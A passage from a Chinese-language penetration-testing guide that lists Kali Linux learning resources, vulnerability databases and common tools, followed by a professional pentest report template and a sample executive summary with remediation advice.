
- **Hack The Box**

一个为以练黑客设计的平台，提供不同难度的挑战，使用 Kali Linux。

[Hack The Box]

- **Udemy 课程**

Udemy 上有各种渗透测试和 Kali Linux 课程，例如“从零开始学习黑客”、“入门 Kali Linux”以及“使用 Kali Linux 进行渗透测试”。这些课程提供了结构化的学习路径和实验。

### 4. 社区与论坛

- **Kali Linux 论坛**

Kali Linux 论坛是一个充满活力的社区，用户可以在那里提问、分享技巧并从社区和 Kali 开发人员处获得故障排除帮助。

[Kali Linux 论坛]

- **Reddit - r/KaliLinux**

r/KaliLinux 子板块是关注新闻、指南、教程和讨论的好地方。它也是提问和获取反馈的好场所。

[r/KaliLinux]

- **Stack Exchange - 信息安全**

Information Security Stack Exchange 是网络安全专业人士的优秀问答平台。它是提问有关渗透测试、Kali Linux 和伦理黑客详细技术问题的好地方。

[信息安全 Stack Exchange]

- **PenTestersForum**

一个专注于渗透测试、伦理黑客和网络安全的论坛。它为所有经验水平的用户提供资源、教程和社区支持。

[PenTestersForum]

### 5. YouTube 频道与视频教程

- **Kali Linux 官方 YouTube 频道**

Kali Linux 官方 YouTube 频道提供了来自 Kali 开发团队的各种教程、演示和演讲。它是视觉学习者的绝佳资源。

[Kali Linux 频道]

- **The Cyber Mentor**

这个由 Heath Adams 运营的 YouTube 频道专注于伦理黑客、渗透测试和网络安全教程。它涵盖了广泛的渗透测试主题，包括 Kali Linux 工具的使用。

[The Cyber Mentor]

- **IppSec**

IppSec 的 YouTube 频道是 Hack The Box 机器演示的热门选择。该频道拥有详细的渗透测试教程，演示了如何使用 Kali Linux 处理各种挑战。

[IppSec 频道]

- NetworkChuck



NetworkChuck 的频道提供了实用的网络安全渗透测试教程。许多视频对初学者友好，并提供了易于理解的解释。

NetworkChuck

# 6. 漏洞数据库与利用程序库

- Exploit-DB

Exploit-DB 是渗透测试人员必不可少的资源。它是一个包含利用程序、漏洞和公共负载（payload）的海量数据库。允许你搜索特定的漏洞以及相关的利用程序。

Exploit-DB

- CVE Details

CVE Details 是一个常见漏洞与披露（CVE）的全面且可搜索数据库，是获取各种软件和系统安全问题最新动态的关键资源。

CVE Details

- NVD（国家漏洞数据库）

NVD 由美国国家标准与技术研究院（NIST）运营，提供了一个漏洞及其相关风险的全面公开数据库。专业人员利用它来了解可能影响系统的漏洞。

NVD

# 7. 漏洞扫描器与渗透测试工具

- Nmap

最广泛使用的网络扫描器，允许渗透测试人员识别网络系统中的开放端口、服务和漏洞。

Nmap

- Burp Suite

一套用于 Web 应用安全测试的流行工具集。它提供了爬虫、扫描和利用 Web 应用的功能。

[Burp Suite]

- Wireshark

一种网络协议分析器，允许你捕获并交互式浏览运行在计算机网络上的流量。对于监控和分析网络流量至关重要。

[Wireshark]

- Metasploit Framework

一个用于开发和执行利用代码的全面渗透测试框架。Metasploit 是最强大的工具之一。

[Metasploit]

# 渗透测试报告模板

渗透测试报告是一份总结渗透测试结果的重要文档。它是任何渗透测试人员必须交付的成果，其目的是向组织沟通漏洞、风险和建议的缓解措施。结构良好的渗透测试报告可以帮助技术和非技术利益相关者理解其系统的安全状况以及可以采取哪些措施来增强。以下是关于如何构建渗透测试报告的详细指南，包含示例模板。

## 渗透测试报告模板

### 1. 首页

- 标题：渗透测试报告
- 公司名称：[客户名称]
- 编制人员：[渗透测试人员/组织]
- 日期：[报告创建日期]
- 报告版本：[版本号]

## 2. 执行摘要

执行摘要提供了发现、风险和行动的高层概述。它面向管理层和可能不需要测试详细细节的非技术利益相关者。

- 测试目标：

提供渗透测试目标的的概述。这可以包括测试基础设施、应用程序和/或内部及外部网络的安全性。

- 范围：

总结参与任务的范围，包括测试了哪些系统、网络或应用程序。还应指定任何排除项或限制条件（例如：未测试的系统、时间限制）。

- 测试方法：

简要说明测试方法，如黑盒测试、白盒测试或灰盒测试，以及测试是自动的还是手动的。

- 发现总结：

列出主要漏洞及其影响。优先强调关键问题，随后是高、中、低风险的发现结果。

- 风险等级与影响：

考虑到所有发现的漏洞，对组织的整体风险水平提供评估（例如：严重、高、中、低）。

- 建议：

总结解决漏洞的最重要建议。为修复步骤提供高层指导。

# 3. 目录

- 1. 执行摘要
- 2. 方法
- 3. 范围

# 4. 详细发现

- 1. 严重漏洞
- 2. 高风险漏洞
- 3. 中风险漏洞
- 4. 低风险漏洞

# 5. 结论

# 6. 修复建议

# 7. 附录

- 1. 使用工具
- 2. 备注与观察
- 3. 参考文献

# 4. 方法

本节概述了执行渗透测试使用的整体方法。它确保了透明度，并帮助读者理解方法和测试阶段。

- 第一阶段：侦察

描述如何收集有关目标的信息（例如：开源情报收集、DNS 枚举、WHOIS 查询）。

- 第二阶段：扫描与枚举

说明所使用的扫描工具（例如：Nmap, Nessus）以及用于识别服务、端口和漏洞的枚举过程。

- 第三阶段：利用

对任何利用技术进行简要描述，包括对已发现漏洞的手动和自动利用。

- 第四阶段：后渗透阶段

提到成功利用后执行的活动，如维持访问、权限提升和横向移动。

- 第五阶段：报告

详细说明如何记录和组织发现的结果。

# 5. 范围

在本节中，详细描述目标环境，包括在测试范围内的特定系统、应用程序和网络，以及被排除的内容。

- 测试系统：

指定处于测试范围内的特定系统、应用程序和网络。

- 排除项：

未参与测试的系统或应用程序（例如：生产环境、某些子网、域名）。

- 测试周期：

说明测试的持续时间。

# 6. 详细发现

此部分构成了报告主体，包含了每个漏洞的详细说明和建议。

- 漏洞 ID：

为每个漏洞分配唯一的 ID 以供参考。

- 漏洞描述：

对每个漏洞进行详细解释，包括它是如何发现的以及为什么构成风险。

- 风险等级（严重、高、中、低）：

根据影响和可利用性为每个发现分配等级。

- 证据/概念证明：

提供支持发现结果的具体证据，如截图、日志或输出内容。包含任何概念证明代码。

- 影响：

描述被利用的可能后果（例如：数据丢失、未经授权的访问、系统破坏）。

- 修复建议：

提供关于缓解或解决漏洞的具体建议。这可能涉及软件补丁、系统重配置或增强安全策略。

- 参考文献：

包括外部引用，如 CVE 标识、供应商文档或行业指南。

# 7. 结论

结论应总结渗透测试的整体发现，强调需要立即处理的关键漏洞。它还简要概述测试期间的行动及其结果。

- 整体风险评估：

对测试环境的整体安全状况提供简洁总结，包括可能被攻击者利用的关键缺陷。

- 关键建议：

根据发现重申组织应采取的重要行动。

# 8. 修复建议

为渗透测试中发现的漏洞提供高层行动计划。

- 优先行动：

列出最重要的修复步骤（例如：修复漏洞、重配置防火墙、实施多重身份验证）。

- 长期建议：

讨论建议的持续改进，如增强安全策略、定期进行安全培训或采用更健全的安全框架。

- 未来测试：

建议进行未来的渗透测试或漏洞扫描以确保持续安全。

# 9. 附录

此部分包含了额外的技术细节、支持证据和参考文献，有助于客户理解并跟进发现的结果。

- 使用工具：

列出渗透测试中使用的所有工具和技术，如 Nmap, Metasploit, Burp Suite, Wireshark 等。

- 备注与观察：

提供任何额外的发现、观察或背景信息，有助于理解报告或未包含在报告正文中。

- 参考文献：

包含外部资源与发现和建议相关的标准。

## 示例报告（节选）

## 执行摘要

**目标：**

本次渗透测试的目标是评估 XYZ 公司外部 Web 及内部网络基础设施的安全态势。本报告概述了发现的漏洞、其风险以及缓解建议。

范围：

本次活动涵盖了以下系统的测试：

- Web 应用程序：www.xyz.com
- 内部网络：10.0.0.0/24

发现总结：

- 关键漏洞：
  - 登录页面存在 SQL 注入漏洞。这允许远程攻击者执行任意 SQL 查询，并从数据库中提取敏感数据。
  - 静态存储的敏感数据加密不足。
- 高风险漏洞：
  - 存在已知漏洞的旧版本软件（Apache 2.4.18）。
  - 防火墙配置不当，导致不必要的端口开放。

## 建议：

- 通过实施预处理语句（prepared statements）或 ORM 解决方案修复 SQL 注入。
- 确保使用 AES-256 等行业标准算法对静态存储和传输中的所有敏感数据进行加密。
- 立即修复过时的软件，并配置防火墙以限制不必要的端口。
